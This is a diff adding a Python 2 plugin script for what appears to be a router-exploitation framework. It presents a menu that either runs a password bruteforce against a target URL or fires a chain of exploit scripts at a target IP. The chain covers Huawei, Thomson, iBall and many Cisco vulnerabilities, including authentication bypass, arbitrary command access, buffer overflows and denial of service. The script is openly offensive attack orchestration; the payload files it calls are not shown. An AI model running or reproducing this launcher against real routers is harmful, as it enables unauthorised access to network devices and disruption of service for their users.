@@ -1,0 +1,120 @@
+#!/usr/bin/python
+import os, sys, time
+import logging
+
+intname = "rsf "
+det = sys.argv[0]
+fin = det.split('.')[-2]
+__plugin__      = "%s.plugin" % (fin)
+RescoursesDir = os.getcwd()
+dandtime = time.strftime("%H:%M:%S")
+logfile = "%s/storage/logs/%s.log" % (RescoursesDir,dandtime)
+
+class Tee(object):
+  def __init__(self):
+    self.file = open(logfile, 'a')
+    self.stdout = sys.stdout
+
+  def __del__(self):
+    sys.stdout = self.stdout
+    self.file.close()
+
+  def write(self, data):
+    self.file.write(data)
+    self.stdout.write(data)
+
+sys.stdout = Tee()
+def dash():
+    while True:
+        line_1 = "" + intname + "(\033[1;31m" + fin + "\033[1;m) > "
+        terminal = raw_input(line_1).lower()
+        time.sleep(0.5)
+        if terminal == 'help':
+            print "\n"
+            print "Core Commands"
+            print "============="
+            print ""
+            print "  Command         Description"
+            print "  -------         -----------"
+            print "  help            show help menu"
+            print "  execute         run the plugin"
+            print "  exit            exit the current plugin"
+            print ""
+        elif terminal == 'execute':
+            main()
+        elif terminal == 'exit':
+            exit()
+        else:
+            print "Unknown syntax: %s" % (terminal)
+
+def main():
+    default = "192.168.1.1"
+    defaulturl = "http://192.168.1.1/"
+    default2 = "80"
+    default3 = "/var/dhcp/dhcps/neighbors_new"
+    default8 = "1"
+    list = "C:\User\passwords.txt"
+
+    print "\033[1;94m[?]\033[1;m Function :: Setup a function to do a service onto the target"
+    print ""
+    print " 0) Bruteforce :: Run a bruteforce attack"
+    print "*1) Exploit :: Exploit multiple attempts with vulnrabilities"
+    print ""
+    function = raw_input('\033[1;92m[+]\033[1;m function: [' + default8 + ']: ') or default8
+
+    if function == '0':
+        print "\033[1;94m[?]\033[1;m TargetURL :: Target URL Address"
+        rhost = raw_input('\033[1;92m[+]\033[1;m target [' + defaulturl + ']: ') or defaulturl
+        print "\033[1;94m[?]\033[1;m Passlist :: Passwordlist Directory"
+        passlist = raw_input('\033[1;92m[+]\033[1;m passlist [' + list + ']: ') or list
+        os.system('python plugins/Internalroute/EXPLODINGFORCE.py ' + passlist + ' ' + rhost + '')
+    elif function == '1':
+        print "\033[1;94m[?]\033[1;m TargetIp :: Target IP Address"
+        rhost = raw_input('\033[1;92m[+]\033[1;m target [' + default + ']: ') or default
+        print "\033[1;94m[?]\033[1;m Port :: Target Port number"
+        port = raw_input('\033[1;92m[+]\033[1;m port [' + default2 + ']: ') or default2
+        print "\033[1;94m[?]\033[1;m Path :: Target Path dir"
+        path = raw_input('\033[1;92m[+]\033[1;m path [' + default3 + ']: ') or default3
+        print "Exploiting", rhost
+        time.sleep(1)
+        #/* Explotation attempts*/
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Huawei"
+        os.system('python3 plugins/Internalroute/Huawei.py -ip %s --port %s --path %s' % (rhost,port,path))
+        print "\033[1;94m[?]\033[1;m Attempting telnet Thomson Wireless VoIP Cable Modem Arbitrary File Access"
+        os.system('python plugins/Internalroute/ex.py %s' % (rhost))
+        os.system('python plugins/Internalroute/zt.py %s' % (rhost))
+        print "Using cisco plugins && more"
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Cisco IOS HTTP Auth Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 3' % (rhost))
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 4' % (rhost))
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 10' % (rhost))
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Cisco Catalyst Memory Leak Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 14' % (rhost))
+        print "\033[1;94m[?]\033[1;m Attempting to exploit iBall Baton 150M Wireless Router - Authentication Bypass"
+        os.system('python plugins/Internalroute/iball.py http://%s' % (rhost))
+        print "[*] Starting Buffer Overflow & Denial of service Vulnerability"
+        time.sleep(3)
+        #/* Bofs & Dos */
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Cisco 514 UDP Flood Denial of Service Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 12' % (rhost))
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Cisco 677/678 Telnet Buffer Overflow Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 1' % (rhost))
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Cisco IOS Software HTTP Request Denial of Service Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 11' % (rhost))
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Cisco 675 Web Administration Denial of Service Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 9' % (rhost))
+        print "\033[1;94m[?]\033[1;m Attempting to exploit CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 13' % (rhost))
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Cisco 675 Web Administration Denial of Service Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 6' % (rhost))
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 5' % (rhost))
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 7' % (rhost))
+        print "\033[1;94m[?]\033[1;m Attempting to exploit Cisco IOS Router Denial of Service Vulnerability"
+        os.system('perl plugins/Internalroute/cisco.pl %s 2' % (rhost))
+    else:
+        print "choose an option!"
+dash()
